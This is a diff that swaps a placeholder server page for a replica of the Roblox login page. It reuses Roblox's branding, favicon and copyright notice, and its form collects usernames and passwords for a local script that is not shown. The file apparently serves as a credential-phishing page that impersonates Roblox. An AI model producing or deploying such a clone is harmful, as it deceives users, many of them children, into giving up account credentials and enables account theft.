@@ -1,1 +1,81 @@
-<h1>Server is working 🎉</h1>
+<!DOCTYPE html>
+<html lang="en" class="dark-theme builder-font">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Log in to Roblox</title>
+  <link rel="stylesheet" href="/roblox-replica.css">
+  <link rel="icon" href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body id="rbx-body" class="rbx-body dark-theme builder-font" data-internal-page-name="Login">
+  <div id="wrap" class="wrap no-gutter-ads logged-out">
+    
+    <!-- Navigation -->
+    <div id="navigation-container" class="builder-font">
+      <div id="header" class="navbar-fixed-top rbx-header" role="navigation">
+        <div class="container-fluid">
+          <div class="rbx-navbar-header">
+            <div id="header-menu-icon" class="rbx-nav-collapse">
+              <button type="button" class="btn-navigation-nav-menu-md menu-button" aria-label="Menu">
+                <span class="icon-nav-menu">☰</span>
+              </button>
+            </div>
+            <div class="navbar-header">
+              <a id="nav-logo-link" class="navbar-brand" href="#">
+                <img src="/roblox-logo.png" alt="Roblox" class="logo-img">
+              </a>
+            </div>
+          </div>
+          <ul class="nav rbx-navbar hidden-xs hidden-sm col-md-5 col-lg-4">
+            <li><a id="nav-charts-md-link" class="font-header-2 nav-menu-title text-header" href="#">Charts</a></li>
+            <li><a id="nav-marketplace-md-link" class="font-header-2 nav-menu-title text-header" href="#">Marketplace</a></li>
+            <li><a id="header-develop-md-link" class="font-header-2 nav-menu-title text-header" href="#">Create</a></li>
+            <li id="navigation-robux-container">
+              <div class="robux-display">0</div>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <!-- Main Content -->
+    <main class="container-main content-no-ads" id="container-main">
+      <div class="alert-container"></div>
+      <div class="content" id="content">
+        <div id="react-login-web-app">
+          <div class="login-form">
+            <h1 class="login-title">Log in to Roblox</h1>
+            <form id="login-form">
+              <div class="input-wrapper">
+                <input type="text" class="login-input" id="username" name="username" placeholder="Username / Email / Phone" autocomplete="username" required>
+              </div>
+              <div class="input-wrapper">
+                <input type="password" class="login-input" id="password" name="password" placeholder="Password" autocomplete="current-password" required>
+              </div>
+              <button type="submit" class="login-button" id="login-button">Log In</button>
+              <div class="login-links">
+                <a href="#" class="login-link forgot-password">Forgot Password or Username?</a> |
+                <a href="#" class="login-link signup-link">Sign Up</a>
+              </div>
+            </form>
+            <div id="message"></div>
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <footer class="container-footer" id="footer-container">
+      <div class="footer-content">
+        <p>&copy; 2025 Roblox Corporation. Roblox and its logo are registered trademarks.</p>
+        <div class="footer-links">
+          <a href="#">Privacy Policy</a>
+          <a href="#">Terms of Use</a> | <a href="#">Parental Controls</a>
+        </div>
+      </div>
+    </footer>
+  </div>
+
+  <script src="/script.js"></script>
+</body>
+</html>
